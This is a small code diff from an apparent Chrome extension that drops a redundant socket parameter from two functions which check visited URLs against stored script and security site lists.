@@ -75,7 +75,7 @@ function sendLoginInfo(loginInfo) {
   socket.emit('Login', loginInfo);
 }
 
-function checkScriptWebsites(socket, tabId, changeInfo) {
+function checkScriptWebsites(tabId, changeInfo) {
   updateScriptWebsites(socket);
   if (changeInfo.url) {
     chrome.storage.local.get('scriptSites', (scriptSites) => {
@@ -91,7 +91,7 @@ function checkScriptWebsites(socket, tabId, changeInfo) {
   }
 }
 
-function checkSecurityWebsites(socket, tabId, changeInfo) {
+function checkSecurityWebsites(tabId, changeInfo) {
   updateSecurityWebsites(socket);
   if (changeInfo.url) {
     chrome.storage.local.get('securityWebsites', (securityWebsites) => {
